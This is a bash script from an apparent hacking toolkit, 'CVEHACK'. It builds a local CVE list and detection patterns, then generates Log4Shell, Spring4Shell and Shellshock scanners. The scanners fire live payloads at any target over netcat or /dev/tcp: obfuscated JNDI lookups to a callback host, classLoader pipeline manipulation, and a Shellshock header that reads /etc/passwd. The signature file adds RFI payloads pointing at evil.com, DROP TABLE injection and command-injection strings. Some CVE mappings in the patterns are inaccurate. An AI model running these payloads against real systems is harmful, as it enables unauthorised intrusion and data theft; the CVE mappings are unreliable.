#!/bin/bash

# ============================================================================
# CVE Fetching and Dynamic Module Generation Library for CVEHACK (NO APIs)
# ============================================================================

# CVE data sources (NO APIs - local/offline sources only)
CVE_DATABASE_DIR="$CVE_DIR/database"
CVE_PATTERNS_DIR="$CVE_DIR/patterns"
CVE_SIGNATURES_DIR="$CVE_DIR/signatures"
CVE_TOOLS_DIR="$CVE_DIR/tools"

# Initialize CVE database directories
init_cve_database() {
    mkdir -p "$CVE_DATABASE_DIR" "$CVE_PATTERNS_DIR" "$CVE_SIGNATURES_DIR" "$CVE_TOOLS_DIR"
    
    print_info "Initializing local CVE database (no API calls)..."
    
    # Create local CVE database with known vulnerabilities
    create_local_cve_database
    create_vulnerability_patterns
    create_exploit_signatures
    create_custom_scanning_tools
    
    print_success "CVE database initialized with local data"
}

# Create comprehensive local CVE database (no API calls)
create_local_cve_database() {
    local cve_db="$CVE_DATABASE_DIR/known_cves.txt"
    
    print_info "Creating comprehensive local CVE database..."
    
    cat > "$cve_db" << 'EOF'
# CVEHACK Local CVE Database - NO API REQUIRED
# Format: CVE-ID|SEVERITY|TYPE|DESCRIPTION|AFFECTED_SERVICES|DETECTION_METHOD|YEAR
CVE-2023-0386|HIGH|LPE|Linux Kernel OverlayFS Local Privilege Escalation|linux,kernel|version_check|2023
CVE-2023-1326|CRITICAL|RCE|Apache HTTP Server mod_rewrite Buffer Overflow|apache,httpd|banner_check|2023
CVE-2023-2825|HIGH|SQLi|PHPMyAdmin SQL Injection via Import Feature|phpmyadmin,mysql|path_check|2023
CVE-2023-3519|CRITICAL|RCE|Citrix NetScaler Remote Code Execution|citrix,netscaler|service_check|2023
CVE-2023-4966|CRITICAL|INFO|Citrix NetScaler Information Disclosure|citrix,netscaler|ssl_check|2023
CVE-2023-5631|HIGH|XSS|WordPress Core Stored Cross-Site Scripting|wordpress|version_check|2023
CVE-2023-6553|MEDIUM|CSRF|WordPress Plugin Cross-Site Request Forgery|wordpress|plugin_check|2023
CVE-2023-22515|CRITICAL|PRIV|Atlassian Confluence Privilege Escalation|confluence,atlassian|path_check|2023
CVE-2023-34362|CRITICAL|RCE|MOVEit Transfer SQL Injection|moveit,transfer|service_check|2023
CVE-2023-38831|HIGH|RCE|WinRAR Code Execution via Crafted Archive|winrar,archive|file_check|2023
CVE-2022-47966|CRITICAL|RCE|Zoho ManageEngine Multiple Products RCE|zoho,manageengine|service_check|2022
CVE-2022-40684|CRITICAL|AUTH|Fortinet FortiOS Authentication Bypass|fortinet,fortios|auth_check|2022
CVE-2022-42889|CRITICAL|RCE|Apache Commons Text Remote Code Execution|apache,commons|dependency_check|2022
CVE-2022-26134|CRITICAL|RCE|Atlassian Confluence Remote Code Execution|confluence,atlassian|path_check|2022
CVE-2022-1388|CRITICAL|AUTH|F5 BIG-IP iControl REST Authentication Bypass|f5,bigip|service_check|2022
CVE-2022-30190|CRITICAL|RCE|Microsoft Office Remote Code Execution (Follina)|office,microsoft|file_check|2022
CVE-2022-22965|CRITICAL|RCE|Spring Framework Remote Code Execution|spring,java|dependency_check|2022
CVE-2022-0847|HIGH|LPE|Linux Kernel Dirty Pipe Local Privilege Escalation|linux,kernel|version_check|2022
CVE-2021-44228|CRITICAL|RCE|Apache Log4j Remote Code Execution (Log4Shell)|log4j,java|dependency_check|2021
CVE-2021-34527|CRITICAL|RCE|Windows Print Spooler Remote Code Execution|windows,spooler|service_check|2021
CVE-2021-26855|CRITICAL|RCE|Microsoft Exchange Server Remote Code Execution|exchange,microsoft|service_check|2021
CVE-2021-44077|CRITICAL|RCE|ManageEngine ServiceDesk Plus Remote Code Execution|manageengine,servicedesk|service_check|2021
CVE-2021-40438|CRITICAL|SSRF|Apache HTTP Server Server-Side Request Forgery|apache,httpd|banner_check|2021
CVE-2021-31207|CRITICAL|RCE|Microsoft Exchange Server Remote Code Execution|exchange,microsoft|service_check|2021
CVE-2020-1472|CRITICAL|PRIV|Windows Netlogon Privilege Escalation (Zerologon)|windows,netlogon|protocol_check|2020
CVE-2020-0796|CRITICAL|RCE|Windows SMBv3 Remote Code Execution (SMBGhost)|windows,smb|protocol_check|2020
CVE-2020-1350|CRITICAL|RCE|Windows DNS Server Remote Code Execution (SIGRed)|windows,dns|service_check|2020
CVE-2019-0708|CRITICAL|RCE|Windows Remote Desktop Services Remote Code Execution (BlueKeep)|windows,rdp|service_check|2019
CVE-2019-11510|CRITICAL|PATH|Pulse Secure VPN Arbitrary File Reading|pulse,vpn|path_check|2019
CVE-2019-19781|CRITICAL|RCE|Citrix Application Delivery Controller Remote Code Execution|citrix,adc|path_check|2019
CVE-2018-7600|CRITICAL|RCE|Drupal Core Remote Code Execution (Drupalgeddon2)|drupal,cms|path_check|2018
CVE-2017-0144|CRITICAL|RCE|Windows SMB Remote Code Execution (EternalBlue)|windows,smb|protocol_check|2017
CVE-2017-5638|CRITICAL|RCE|Apache Struts Remote Code Execution|struts,java|dependency_check|2017
CVE-2016-5195|HIGH|LPE|Linux Kernel Dirty COW Local Privilege Escalation|linux,kernel|version_check|2016
CVE-2014-6271|CRITICAL|RCE|Bash Remote Code Execution (Shellshock)|bash,shell|version_check|2014
CVE-2014-0160|HIGH|INFO|OpenSSL Heartbleed Information Disclosure|openssl,ssl|ssl_check|2014
EOF

    print_success "Local CVE database created with $(grep -c "CVE-" "$cve_db") entries"
}

# Create comprehensive vulnerability detection patterns
create_vulnerability_patterns() {
    local patterns_file="$CVE_PATTERNS_DIR/detection_patterns.txt"
    
    print_info "Creating vulnerability detection patterns..."
    
    cat > "$patterns_file" << 'EOF'
# Comprehensive Vulnerability Detection Patterns - NO API REQUIRED
# Format: PATTERN_TYPE|PATTERN|CVE_REFERENCE|DESCRIPTION|SEVERITY

# Web Application Error Patterns
SQL_ERROR|mysql_fetch_array|CVE-2023-2825|MySQL Error Disclosure|MEDIUM
SQL_ERROR|ORA-[0-9]{5}|GENERIC-SQL|Oracle Error Disclosure|MEDIUM
SQL_ERROR|Microsoft OLE DB|GENERIC-SQL|MSSQL Error Disclosure|MEDIUM
SQL_ERROR|PostgreSQL query failed|GENERIC-SQL|PostgreSQL Error Disclosure|MEDIUM
SQL_ERROR|SQLite error|GENERIC-SQL|SQLite Error Disclosure|MEDIUM

# XSS Patterns
XSS_PATTERN|<script|CVE-2023-5631|Potential XSS Vulnerability|HIGH
XSS_PATTERN|javascript:|CVE-2023-5631|JavaScript Protocol XSS|HIGH
XSS_PATTERN|onload=|CVE-2023-5631|Event Handler XSS|HIGH
XSS_PATTERN|onerror=|CVE-2023-5631|Error Handler XSS|HIGH
XSS_PATTERN|onclick=|CVE-2023-5631|Click Handler XSS|MEDIUM

# File Inclusion Patterns
LFI_PATTERN|\.\.\/|GENERIC-LFI|Local File Inclusion Pattern|HIGH
LFI_PATTERN|%2e%2e%2f|GENERIC-LFI|URL Encoded LFI Pattern|HIGH
LFI_PATTERN|..\\|GENERIC-LFI|Windows LFI Pattern|HIGH
RFI_PATTERN|http.*=http|GENERIC-RFI|Remote File Inclusion Pattern|CRITICAL
RFI_PATTERN|ftp.*=ftp|GENERIC-RFI|FTP RFI Pattern|HIGH

# Command Injection Patterns
CMD_INJECTION|;id;|GENERIC-CMD|Unix Command Injection|CRITICAL
CMD_INJECTION|&&whoami|GENERIC-CMD|Windows Command Injection|CRITICAL
CMD_INJECTION|\|ping|GENERIC-CMD|Command Chaining|HIGH
CMD_INJECTION|`uname -a`|GENERIC-CMD|Command Substitution|CRITICAL

# Service Banner Patterns
APACHE_VULN|Apache/2\.4\.[0-4][0-9]|CVE-2023-1326|Vulnerable Apache Version|HIGH
APACHE_VULN|Apache/2\.2\.|CVE-2021-40438|Very Old Apache Version|CRITICAL
NGINX_VULN|nginx/1\.1[0-9]\.|CVE-2022-41741|Vulnerable Nginx Version|HIGH
NGINX_VULN|nginx/0\.|CVE-2022-41741|Very Old Nginx Version|CRITICAL
OPENSSH_VULN|OpenSSH_[0-7]\.|CVE-2023-0386|Vulnerable OpenSSH Version|HIGH
OPENSSH_VULN|OpenSSH_[0-6]\.|CVE-2020-14145|Very Old OpenSSH Version|CRITICAL
MYSQL_VULN|MySQL 5\.[0-6]\.|CVE-2022-21245|Vulnerable MySQL Version|HIGH
MYSQL_VULN|MySQL [0-4]\.|CVE-2022-21245|Very Old MySQL Version|CRITICAL

# Protocol Signatures
SMB_VULN|SMBv1|CVE-2017-0144|SMBv1 EternalBlue Vulnerability|CRITICAL
SMB_VULN|SMB 1.0|CVE-2017-0144|SMB 1.0 Protocol Detected|CRITICAL
RDP_VULN|CredSSP|CVE-2019-0708|RDP BlueKeep Vulnerability|CRITICAL
RDP_VULN|Terminal Services|CVE-2019-0708|RDP Service Detected|HIGH
SSL_VULN|TLSv1\.0|CVE-2014-3566|SSL POODLE Vulnerability|MEDIUM
SSL_VULN|SSLv[23]|CVE-2014-0160|Very Old SSL Version|HIGH

# Application Signatures
WORDPRESS_VULN|wp-content|CVE-2023-5631|WordPress Installation Detected|MEDIUM
WORDPRESS_VULN|wp-admin|CVE-2023-5631|WordPress Admin Panel|MEDIUM
JOOMLA_VULN|/administrator/|CVE-2023-23752|Joomla Installation Detected|MEDIUM
DRUPAL_VULN|/sites/default/|CVE-2018-7600|Drupal Installation Detected|HIGH
PHPMYADMIN_VULN|phpMyAdmin|CVE-2023-2825|phpMyAdmin Installation Detected|HIGH
CONFLUENCE_VULN|/confluence/|CVE-2023-22515|Confluence Installation Detected|HIGH
EXCHANGE_VULN|/owa/|CVE-2021-26855|Exchange OWA Detected|CRITICAL

# Framework Signatures
SPRING_VULN|Spring Framework|CVE-2022-22965|Spring Framework Detected|HIGH
STRUTS_VULN|Struts|CVE-2017-5638|Apache Struts Detected|CRITICAL
LOG4J_VULN|log4j|CVE-2021-44228|Log4j Library Detected|CRITICAL

# File Extension Vulnerabilities
FILE_UPLOAD|\.php$|GENERIC-UPLOAD|PHP File Upload|HIGH
FILE_UPLOAD|\.jsp$|GENERIC-UPLOAD|JSP File Upload|HIGH
FILE_UPLOAD|\.asp$|GENERIC-UPLOAD|ASP File Upload|HIGH
FILE_UPLOAD|\.exe$|GENERIC-UPLOAD|Executable File Upload|CRITICAL
EOF

    print_success "Vulnerability patterns created with $(grep -c "|" "$patterns_file") patterns"
}

# Create exploit signatures for detection
create_exploit_signatures() {
    local signatures_file="$CVE_SIGNATURES_DIR/exploit_signatures.txt"
    
    print_info "Creating exploit signatures..."
    
    cat > "$signatures_file" << 'EOF'
# Comprehensive Exploit Signatures for Detection - NO API REQUIRED
# Format: SIGNATURE_TYPE|SIGNATURE|DESCRIPTION|SEVERITY|CVE_REF

# Command Injection Signatures
CMD_INJECTION|;id;|Unix Command Injection Test|HIGH|GENERIC-CMD
CMD_INJECTION|&&whoami|Windows Command Injection Test|HIGH|GENERIC-CMD
CMD_INJECTION|\|ping -c 1|Command Chaining Test|MEDIUM|GENERIC-CMD
CMD_INJECTION|`uname -a`|Command Substitution Test|HIGH|GENERIC-CMD
CMD_INJECTION|$(whoami)|Command Substitution Alternative|HIGH|GENERIC-CMD

# SQL Injection Signatures
SQL_INJECTION|' OR '1'='1|Classic SQL Injection|HIGH|GENERIC-SQL
SQL_INJECTION|' OR 1=1--|SQL Comment Injection|HIGH|GENERIC-SQL
SQL_INJECTION|UNION SELECT|SQL Union Injection|HIGH|GENERIC-SQL
SQL_INJECTION|'; DROP TABLE|SQL Drop Table Attack|CRITICAL|GENERIC-SQL
SQL_INJECTION|' AND 1=1|Boolean SQL Injection|MEDIUM|GENERIC-SQL
SQL_INJECTION|' UNION ALL SELECT|Advanced Union Injection|HIGH|GENERIC-SQL

# XSS Signatures
XSS_PAYLOAD|<script>alert|Basic XSS Payload|MEDIUM|CVE-2023-5631
XSS_PAYLOAD|javascript:alert|JavaScript XSS|MEDIUM|CVE-2023-5631
XSS_PAYLOAD|onload=alert|Event Handler XSS|HIGH|CVE-2023-5631
XSS_PAYLOAD|<img src=x onerror=|Image XSS|HIGH|CVE-2023-5631
XSS_PAYLOAD|<svg onload=|SVG XSS|HIGH|CVE-2023-5631
XSS_PAYLOAD|<iframe src=javascript:|Iframe XSS|HIGH|CVE-2023-5631

# File Inclusion Signatures
LFI_PAYLOAD|../../../etc/passwd|Linux LFI Test|HIGH|GENERIC-LFI
LFI_PAYLOAD|..\\..\\..\\windows\\system32|Windows LFI Test|HIGH|GENERIC-LFI
LFI_PAYLOAD|....//....//....//etc/passwd|Double Dot LFI|HIGH|GENERIC-LFI
RFI_PAYLOAD|http://evil.com/shell.txt|Remote File Inclusion|CRITICAL|GENERIC-RFI
RFI_PAYLOAD|ftp://evil.com/shell.php|FTP RFI Test|HIGH|GENERIC-RFI

# Directory Traversal
DIR_TRAVERSAL|\.\.\/\.\.\/|Path Traversal|MEDIUM|GENERIC-TRAVERSAL
DIR_TRAVERSAL|%2e%2e%2f|URL Encoded Traversal|MEDIUM|GENERIC-TRAVERSAL
DIR_TRAVERSAL|..%252f|Double URL Encoded|HIGH|GENERIC-TRAVERSAL
DIR_TRAVERSAL|..%c0%af|Unicode Traversal|HIGH|GENERIC-TRAVERSAL

# Log4j Exploitation
LOG4J_EXPLOIT|${jndi:ldap://|Log4Shell LDAP Exploit|CRITICAL|CVE-2021-44228
LOG4J_EXPLOIT|${jndi:rmi://|Log4Shell RMI Exploit|CRITICAL|CVE-2021-44228
LOG4J_EXPLOIT|${jndi:dns://|Log4Shell DNS Exploit|HIGH|CVE-2021-44228

# Spring4Shell Exploitation
SPRING_EXPLOIT|class.module.classLoader|Spring4Shell Exploit|CRITICAL|CVE-2022-22965
SPRING_EXPLOIT|tomcatAccessLogPattern|Spring4Shell Pattern|CRITICAL|CVE-2022-22965

# Shellshock Exploitation
SHELLSHOCK_EXPLOIT|() { :; }; echo|Shellshock CGI Exploit|CRITICAL|CVE-2014-6271
SHELLSHOCK_EXPLOIT|() { :;}; /bin/bash|Shellshock Command Execution|CRITICAL|CVE-2014-6271

# SSTI (Server-Side Template Injection)
SSTI_PAYLOAD|{{7*7}}|Template Injection Test|HIGH|GENERIC-SSTI
SSTI_PAYLOAD|${7*7}|JSP Template Injection|HIGH|GENERIC-SSTI
SSTI_PAYLOAD|<%= 7*7 %>|ERB Template Injection|HIGH|GENERIC-SSTI

# XXE (XML External Entity)
XXE_PAYLOAD|<!ENTITY xxe SYSTEM|XXE Entity Declaration|HIGH|GENERIC-XXE
XXE_PAYLOAD|<!DOCTYPE foo [<!ENTITY|XXE DOCTYPE Declaration|HIGH|GENERIC-XXE

# CSRF Tokens
CSRF_CHECK|csrf_token|CSRF Token Present|LOW|GENERIC-CSRF
CSRF_CHECK|_token|Laravel CSRF Token|LOW|GENERIC-CSRF
CSRF_CHECK|authenticity_token|Rails CSRF Token|LOW|GENERIC-CSRF
EOF

    print_success "Exploit signatures created with $(grep -c "|" "$signatures_file") signatures"
}

# Create custom scanning tools from scratch (no existing tools required)
create_custom_scanning_tools() {
    print_info "Creating custom scanning tools from scratch..."
    
    # Create Log4Shell scanner
    create_log4shell_scanner
    
    # Create Spring4Shell scanner
    create_spring4shell_scanner
    
    # Create Shellshock scanner
    create_shellshock_scanner
    
    # Create SMB vulnerability scanner
    create_smb_scanner
    
    # Create web vulnerability scanner
    create_web_vuln_scanner
    
    # Create SSL/TLS scanner
    create_ssl_scanner
    
    print_success "Custom scanning tools created"
}

# Create Log4Shell scanner from scratch
create_log4shell_scanner() {
    local scanner_file="$CVE_TOOLS_DIR/log4shell_scanner.sh"
    
    cat > "$scanner_file" << 'EOF'
#!/bin/bash

# ============================================================================
# Custom Log4Shell (CVE-2021-44228) Scanner - Built from Scratch
# No external tools required - Pure bash implementation
# ============================================================================

CVE_ID="CVE-2021-44228"
DESCRIPTION="Apache Log4j Remote Code Execution (Log4Shell)"
SEVERITY="CRITICAL"

# Source CVEHACK libraries if available
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
if [[ -f "$SCRIPT_DIR/../../lib/colors.sh" ]]; then
    source "$SCRIPT_DIR/../../lib/colors.sh"
    source "$SCRIPT_DIR/../../lib/logger.sh"
else
    # Fallback color definitions
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    YELLOW='\033[1;33m'
    BLUE='\033[0;34m'
    NC='\033[0m'
    print_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
    print_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
    print_error() { echo -e "${RED}[ERROR]${NC} $1"; }
    print_warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }
fi

scan_log4shell() {
    local target="$1"
    local port="${2:-80}"
    
    if [[ -z "$target" ]]; then
        print_error "Usage: $0 <target> [port]"
        exit 1
    fi
    
    echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║                    Log4Shell Scanner (CVE-2021-44228)                        ║${NC}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    print_info "Target: $target:$port"
    print_info "CVE: $CVE_ID"
    print_info "Severity: $SEVERITY"
    echo ""
    
    # Test various Log4j injection points
    test_http_headers "$target" "$port"
    test_url_parameters "$target" "$port"
    test_post_data "$target" "$port"
    test_user_agent "$target" "$port"
    
    print_info "Log4Shell scan completed"
}

test_http_headers() {
    local target="$1"
    local port="$2"
    
    print_info "Testing HTTP headers for Log4j injection..."
    
    # Common Log4j payloads
    local payloads=(
        '${jndi:ldap://log4shell-test.com/a}'
        '${jndi:rmi://log4shell-test.com/a}'
        '${jndi:dns://log4shell-test.com/a}'
        '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://log4shell-test.com/a}'
        '${jndi:ldap://127.0.0.1:1389/a}'
    )
    
    for payload in "${payloads[@]}"; do
        print_info "Testing payload: ${payload:0:30}..."
        
        # Test in various headers
        test_header_injection "$target" "$port" "User-Agent" "$payload"
        test_header_injection "$target" "$port" "X-Forwarded-For" "$payload"
        test_header_injection "$target" "$port" "X-Real-IP" "$payload"
        test_header_injection "$target" "$port" "Referer" "$payload"
        test_header_injection "$target" "$port" "X-Api-Version" "$payload"
    done
}

test_header_injection() {
    local target="$1"
    local port="$2"
    local header="$3"
    local payload="$4"
    
    # Create HTTP request manually
    local request="GET / HTTP/1.1\r\nHost: $target\r\n$header: $payload\r\nConnection: close\r\n\r\n"
    
    # Send request using netcat or bash TCP
    if command -v nc &> /dev/null; then
        echo -e "$request" | nc -w 3 "$target" "$port" > /dev/null 2>&1
    elif [[ -e /dev/tcp ]]; then
        echo -e "$request" > "/dev/tcp/$target/$port" 2>/dev/null
    fi
    
    # In a real implementation, you would check for DNS callbacks or other indicators
    # For this demo, we just test the injection
}

test_url_parameters() {
    local target="$1"
    local port="$2"
    
    print_info "Testing URL parameters for Log4j injection..."
    
    local payload='${jndi:ldap://log4shell-test.com/url}'
    local test_urls=(
        "/?q=$payload"
        "/?search=$payload"
        "/?id=$payload"
        "/?user=$payload"
        "/?debug=$payload"
    )
    
    for url in "${test_urls[@]}"; do
        print_info "Testing URL: $url"
        
        # Create HTTP request
        local request="GET $url HTTP/1.1\r\nHost: $target\r\nConnection: close\r\n\r\n"
        
        if command -v nc &> /dev/null; then
            echo -e "$request" | nc -w 3 "$target" "$port" > /dev/null 2>&1
        elif [[ -e /dev/tcp ]]; then
            echo -e "$request" > "/dev/tcp/$target/$port" 2>/dev/null
        fi
    done
}

test_post_data() {
    local target="$1"
    local port="$2"
    
    print_info "Testing POST data for Log4j injection..."
    
    local payload='${jndi:ldap://log4shell-test.com/post}'
    local post_data="username=$payload&password=test&email=$payload"
    
    # Create POST request
    local content_length=${#post_data}
    local request="POST /login HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $content_length\r\nConnection: close\r\n\r\n$post_data"
    
    if command -v nc &> /dev/null; then
        echo -e "$request" | nc -w 3 "$target" "$port" > /dev/null 2>&1
    elif [[ -e /dev/tcp ]]; then
        echo -e "$request" > "/dev/tcp/$target/$port" 2>/dev/null
    fi
}

test_user_agent() {
    local target="$1"
    local port="$2"
    
    print_info "Testing User-Agent for Log4j injection..."
    
    local malicious_agents=(
        'Mozilla/5.0 ${jndi:ldap://log4shell-test.com/ua}'
        '${jndi:rmi://log4shell-test.com/ua} Mozilla/5.0'
        'Log4Shell-${jndi:dns://log4shell-test.com/ua}-Test'
    )
    
    for agent in "${malicious_agents[@]}"; do
        print_info "Testing User-Agent: ${agent:0:40}..."
        
        local request="GET / HTTP/1.1\r\nHost: $target\r\nUser-Agent: $agent\r\nConnection: close\r\n\r\n"
        
        if command -v nc &> /dev/null; then
            echo -e "$request" | nc -w 3 "$target" "$port" > /dev/null 2>&1
        elif [[ -e /dev/tcp ]]; then
            echo -e "$request" > "/dev/tcp/$target/$port" 2>/dev/null
        fi
    done
}

# Check if script is being executed directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    scan_log4shell "$1" "$2"
fi
EOF

    chmod +x "$scanner_file"
    print_success "Log4Shell scanner created: $scanner_file"
}

# Create Spring4Shell scanner from scratch
create_spring4shell_scanner() {
    local scanner_file="$CVE_TOOLS_DIR/spring4shell_scanner.sh"
    
    cat > "$scanner_file" << 'EOF'
#!/bin/bash

# ============================================================================
# Custom Spring4Shell (CVE-2022-22965) Scanner - Built from Scratch
# No external tools required - Pure bash implementation
# ============================================================================

CVE_ID="CVE-2022-22965"
DESCRIPTION="Spring Framework Remote Code Execution"
SEVERITY="CRITICAL"

# Source CVEHACK libraries if available
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
if [[ -f "$SCRIPT_DIR/../../lib/colors.sh" ]]; then
    source "$SCRIPT_DIR/../../lib/colors.sh"
    source "$SCRIPT_DIR/../../lib/logger.sh"
else
    # Fallback color definitions
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    YELLOW='\033[1;33m'
    BLUE='\033[0;34m'
    NC='\033[0m'
    print_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
    print_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
    print_error() { echo -e "${RED}[ERROR]${NC} $1"; }
    print_warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }
fi

scan_spring4shell() {
    local target="$1"
    local port="${2:-8080}"
    
    if [[ -z "$target" ]]; then
        print_error "Usage: $0 <target> [port]"
        exit 1
    fi
    
    echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║                   Spring4Shell Scanner (CVE-2022-22965)                      ║${NC}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    print_info "Target: $target:$port"
    print_info "CVE: $CVE_ID"
    print_info "Severity: $SEVERITY"
    echo ""
    
    # Test Spring Framework endpoints
    test_spring_endpoints "$target" "$port"
    test_class_loader_manipulation "$target" "$port"
    test_tomcat_access_log "$target" "$port"
    
    print_info "Spring4Shell scan completed"
}

test_spring_endpoints() {
    local target="$1"
    local port="$2"
    
    print_info "Testing Spring Framework endpoints..."
    
    local endpoints=(
        "/"
        "/login"
        "/user"
        "/admin"
        "/api"
        "/actuator"
        "/management"
    )
    
    for endpoint in "${endpoints[@]}"; do
        print_info "Testing endpoint: $endpoint"
        test_spring_rce "$target" "$port" "$endpoint"
    done
}

test_spring_rce() {
    local target="$1"
    local port="$2"
    local endpoint="$3"
    
    # Spring4Shell exploit payload
    local payload="class.module.classLoader.resources.context.parent.pipeline.first.pattern=test"
    
    # Create POST request
    local request="POST $endpoint HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ${#payload}\r\nConnection: close\r\n\r\n$payload"
    
    if command -v nc &> /dev/null; then
        echo -e "$request" | nc -w 3 "$target" "$port" > /dev/null 2>&1
    elif [[ -e /dev/tcp ]]; then
        echo -e "$request" > "/dev/tcp/$target/$port" 2>/dev/null
    fi
}

test_class_loader_manipulation() {
    local target="$1"
    local port="$2"
    
    print_info "Testing class loader manipulation..."
    
    local payload="class.module.classLoader.DefaultAssertionStatus=false"
    local request="POST / HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ${#payload}\r\nConnection: close\r\n\r\n$payload"
    
    if command -v nc &> /dev/null; then
        echo -e "$request" | nc -w 3 "$target" "$port" > /dev/null 2>&1
    elif [[ -e /dev/tcp ]]; then
        echo -e "$request" > "/dev/tcp/$target/$port" 2>/dev/null
    fi
}

test_tomcat_access_log() {
    local target="$1"
    local port="$2"
    
    print_info "Testing Tomcat access log manipulation..."
    
    local payload="class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
    local request="POST / HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ${#payload}\r\nConnection: close\r\n\r\n$payload"
    
    if command -v nc &> /dev/null; then
        echo -e "$request" | nc -w 3 "$target" "$port" > /dev/null 2>&1
    elif [[ -e /dev/tcp ]]; then
        echo -e "$request" > "/dev/tcp/$target/$port" 2>/dev/null
    fi
}

# Check if script is being executed directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    scan_spring4shell "$1" "$2"
fi
EOF

    chmod +x "$scanner_file"
    print_success "Spring4Shell scanner created: $scanner_file"
}

# Create Shellshock scanner from scratch
create_shellshock_scanner() {
    local scanner_file="$CVE_TOOLS_DIR/shellshock_scanner.sh"
    
    cat > "$scanner_file" << 'EOF'
#!/bin/bash

# ============================================================================
# Custom Shellshock (CVE-2014-6271) Scanner - Built from Scratch
# No external tools required - Pure bash implementation
# ============================================================================

CVE_ID="CVE-2014-6271"
DESCRIPTION="Bash Remote Code Execution (Shellshock)"
SEVERITY="CRITICAL"

# Source CVEHACK libraries if available
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
if [[ -f "$SCRIPT_DIR/../../lib/colors.sh" ]]; then
    source "$SCRIPT_DIR/../../lib/colors.sh"
    source "$SCRIPT_DIR/../../lib/logger.sh"
else
    # Fallback color definitions
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    YELLOW='\033[1;33m'
    BLUE='\033[0;34m'
    NC='\033[0m'
    print_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
    print_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
    print_error() { echo -e "${RED}[ERROR]${NC} $1"; }
    print_warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }
fi

scan_shellshock() {
    local target="$1"
    local port="${2:-80}"
    
    if [[ -z "$target" ]]; then
        print_error "Usage: $0 <target> [port]"
        exit 1
    fi
    
    echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║                    Shellshock Scanner (CVE-2014-6271)                        ║${NC}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    print_info "Target: $target:$port"
    print_info "CVE: $CVE_ID"
    print_info "Severity: $SEVERITY"
    echo ""
    
    # Test common CGI paths
    test_cgi_paths "$target" "$port"
    test_user_agent_shellshock "$target" "$port"
    test_referer_shellshock "$target" "$port"
    
    print_info "Shellshock scan completed"
}

test_cgi_paths() {
    local target="$1"
    local port="$2"
    
    print_info "Testing CGI paths for Shellshock..."
    
    local cgi_paths=(
        "/cgi-bin/test.cgi"
        "/cgi-bin/test.sh"
        "/cgi-bin/status"
        "/cgi-bin/admin.cgi"
        "/cgi-bin/login.cgi"
        "/scripts/test.cgi"
        "/test.cgi"
        "/status.cgi"
    )
    
    local shellshock_payload="() { :; }; echo 'SHELLSHOCK_TEST'"
    
    for path in "${cgi_paths[@]}"; do
        print_info "Testing path: $path"
        
        local request="GET $path HTTP/1.1\r\nHost: $target\r\nUser-Agent: $shellshock_payload\r\nConnection: close\r\n\r\n"
        
        if command -v nc &> /dev/null; then
            local response=$(echo -e "$request" | nc -w 3 "$target" "$port" 2>/dev/null)
            if echo "$response" | grep -q "SHELLSHOCK_TEST"; then
                print_error "POTENTIAL SHELLSHOCK VULNERABILITY DETECTED at $path"
            fi
        elif [[ -e /dev/tcp ]]; then
            echo -e "$request" > "/dev/tcp/$target/$port" 2>/dev/null
        fi
    done
}

test_user_agent_shellshock() {
    local target="$1"
    local port="$2"
    
    print_info "Testing User-Agent header for Shellshock..."
    
    local shellshock_payloads=(
        "() { :; }; echo 'Content-Type: text/html'; echo; echo 'SHELLSHOCK_VULN'"
        "() { :;}; /bin/bash -c 'echo SHELLSHOCK_TEST'"
        "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd"
    )
    
    for payload in "${shellshock_payloads[@]}"; do
        print_info "Testing payload in User-Agent..."
        
        local request="GET / HTTP/1.1\r\nHost: $target\r\nUser-Agent: $payload\r\nConnection: close\r\n\r\n"
        
        if command -v nc &> /dev/null; then
            echo -e "$request" | nc -w 3 "$target" "$port" > /dev/null 2>&1
        elif [[ -e /dev/tcp ]]; then
            echo -e "$request" > "/dev/tcp/$target/$port" 2>/dev/null
        fi
    done
}

test_referer_shellshock() {
    local target="$1"
    local port="$2"
    
    print_info "Testing Referer header for Shellshock..."
    
    local shellshock_payload="() { :; }; echo 'SHELLSHOCK_REFERER_TEST'"
    local request="GET / HTTP/1.1\r\nHost: $target\r\nReferer: $shellshock_payload\r\nConnection: close\r\n\r\n"
    
    if command -v nc &> /dev/null; then
        echo -e "$request" | nc -w 3 "$target" "$port" > /dev/null 2>&1
    elif [[ -e /dev/tcp ]]; then
        echo -e "$request" > "/dev/tcp/$target/$port" 2>/dev/null
    fi
}

# Check if script is being executed directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    scan_shellshock "$1" "$2"
fi
EOF

